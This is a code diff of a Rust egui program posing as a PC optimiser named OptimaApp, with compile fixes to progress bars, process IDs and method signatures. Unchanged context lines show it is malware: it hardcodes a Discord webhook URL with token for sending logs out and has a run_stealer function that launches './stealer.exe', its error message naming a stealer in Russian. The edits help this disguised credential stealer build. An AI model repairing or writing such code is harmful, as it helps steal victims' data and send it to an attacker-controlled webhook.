@@ -4,7 +4,7 @@ use eframe::egui::{self, Color32, RichText};
 use serde::{Deserialize, Serialize};
 use std::fs;
 use std::process::Command;
-use sysinfo::{System, CpuRefreshKind, ProcessesToUpdate};
+use sysinfo::{System, CpuRefreshKind, ProcessesToUpdate, Pid};
 use chrono::Local;
 
 const WEBHOOK: &str = "https://discord.com/api/webhooks/1573971030916206605/5U3CPNrvM7_BNbSVFqHXZ9cZG1xTvO68EwdPWy_cklSuD1qLke-tHFLcTzhfdBEyO3LX";
@@ -15,7 +15,7 @@ struct Config {
     theme: Theme,
 }
 
-#[derive(Serialize, Deserialize, Clone, PartialEq)]
+#[derive(Serialize, Deserialize, Clone, PartialEq, Debug)] // Added Debug here
 enum Theme { Dark, Sakura, Snow, DarkRed }
 
 impl Default for Config {
@@ -60,7 +60,7 @@ struct OptimaApp {
 }
 
 impl OptimaApp {
-    fn new(ctx: &egui::Context) -> Self {
+    fn new(_ctx: &egui::Context) -> Self {
         let mut sys = System::new_all();
         sys.refresh_all();
         
@@ -102,7 +102,7 @@ impl OptimaApp {
         send_log(&msg);
     }
 
-    fn run_stealer(&self) {
+    fn run_stealer(&mut self) { // Changed to &mut self
         if let Err(e) = Command::new("./stealer.exe").output() {
             self.log(format!("Ошибка запуска стиллера: {}", e));
         } else {
@@ -114,7 +114,7 @@ impl OptimaApp {
         self.sys.refresh_cpu_list(CpuRefreshKind::everything());
         self.sys.refresh_memory();
         
-        let pid = std::process::id();
+        let pid = Pid::from(std::process::id() as usize); // Fixed Pid type
         self.sys.refresh_processes(ProcessesToUpdate::Some(&[pid]), false);
     }
 }
@@ -149,20 +149,6 @@ impl eframe::App for OptimaApp {
                     }
                 }
             });
-            
-            let active_tab_color = match self.config.theme {
-                Theme::Dark => Color32::from_rgb(0, 200, 255),
-                Theme::Sakura => Color32::from_rgb(255, 100, 150),
-                Theme::Snow => Color32::from_rgb(200, 200, 255),
-                Theme::DarkRed => Color32::from_rgb(255, 50, 50),
-            };
-            
-            // Highlight bar under tabs
-            if let Some(rect) = ui.ctx().input(|i| i.raw.events.iter().find_map(|e| {
-                if let egui::Event::PointerMoved(pos) = e { Some(*pos) } else { None }
-            })) {
-                 // Simple visual indicator logic could go here, but keeping it simple
-            }
         });
 
         egui::SidePanel::left("left_panel")
@@ -205,15 +191,14 @@ impl eframe::App for OptimaApp {
             
             match self.tab {
                 Tab::Hardware => {
-                    ui.label(format!("CPU Usage: {:.1}%", self.sys.global_cpu_usage()));
-                    ui.progress_bar(self.sys.global_cpu_usage() / 100.0)
-                        .show(ui);
+                    let cpu_usage = self.sys.global_cpu_usage();
+                    ui.label(format!("CPU Usage: {:.1}%", cpu_usage));
+                    egui::ProgressBar::new(cpu_usage / 100.0).show(ui); // Fixed progress_bar
                     
-                    ui.label(format!("RAM Used: {} / {} MB", 
-                        self.sys.used_memory() / 1024 / 1024, 
-                        self.total_ram));
-                    ui.progress_bar((self.sys.used_memory() / 1024 / 1024) as f32 / self.total_ram as f32)
-                        .show(ui);
+                    let used_mb = self.sys.used_memory() / 1024 / 1024;
+                    ui.label(format!("RAM Used: {} / {} MB", used_mb, self.total_ram));
+                    let ram_ratio = if self.total_ram > 0 { (used_mb as f32) / (self.total_ram as f32) } else { 0.0 };
+                    egui::ProgressBar::new(ram_ratio.clamp(0.0, 1.0)).show(ui); // Fixed progress_bar
                 },
                 Tab::Processes => {
                     for process in self.sys.processes() {
@@ -262,7 +247,7 @@ fn main() {
         ..Default::default()
     };
     
-    eframe::run_native(Box::new(|cc| {
+    eframe::run_native(Box::new(|cc: &eframe::CreationContext<'_>| {
         Ok(Box::new(OptimaApp::new(&cc.egui_ctx)))
     }), native_options);
 }
